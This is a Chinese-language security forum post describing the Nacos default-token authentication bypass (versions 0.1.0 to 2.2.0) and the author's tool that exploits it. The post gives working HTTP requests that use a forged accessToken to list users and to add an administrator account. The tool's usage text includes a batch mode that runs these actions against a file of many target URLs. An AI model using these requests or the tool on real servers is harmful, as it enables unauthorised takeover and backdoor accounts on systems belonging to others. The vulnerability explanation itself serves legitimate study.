首发于t00ls.com

### 漏洞原理

好多大佬都分享过了，这里就简单说下：

Nacos漏洞版本`/conf` 默认配置文件 `application.properties ` 中，`nacos.core.auth.default.token.secret.key` 使用了硬编码，使用该key可构造jwt进行token认证。

认证成功后获得`accessToken` ，使用`accessToken` 可对Naocs进行任意操作（这不废话么，已经登录了）

### 影响范围

0.1.0 <= Nacos <= 2.2.0

### 工具思路
既然登录后使用`accessToken`可以进行任意操作，那直接查看管理员或者干脆新增用户登录不就得了么，这里加上认证成功后的token 直接使用CVE-2021-29441的payload读取用户列表和新增系统用户，如下：

查看用户列表
```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: xxx
accessToken: xxxxxx
```
新增管理员
```http
POST /nacos/v1/auth/users HTTP/1.1
Host: xxx
Content-Type: application/x-www-form-urlencoded
accessToken: xxx
Content-Length: 27

username=fuck&password=fuck
```

### Tools Usage

```shell
_____                 ____      ___         _ _   _____     _
|   | |___ ___ ___ ___|    \ ___|  _|___ _ _| | |_|_   _|___| |_ ___ ___
| | | | .'|  _| . |_ -|  |  | -_|  _| .'| | | |  _| | | | . | '_| -_|   |
|_|___|__,|___|___|___|____/|___|_| |__,|___|_|_|   |_| |___|_,_|___|_|_|

Alibaba Nacos Default Token身份认证绕过 author: Dghpi9
vul version: 0.1.0 <= Nacos <= 2.2.0
Usage:
 -u http://192.168.0.1:8848 -g  读取用户列表
 -u http://192.168.0.1:8848 -a  新增系统用户
 -f url.txt -g  批量读取用户列表
 -f url.txt -a  批量新增用户
Options:
  -u string
        指定单个目标
  -f string
        传入文件列表
  -g    读取用户列表
  -a    新增系统用户
```

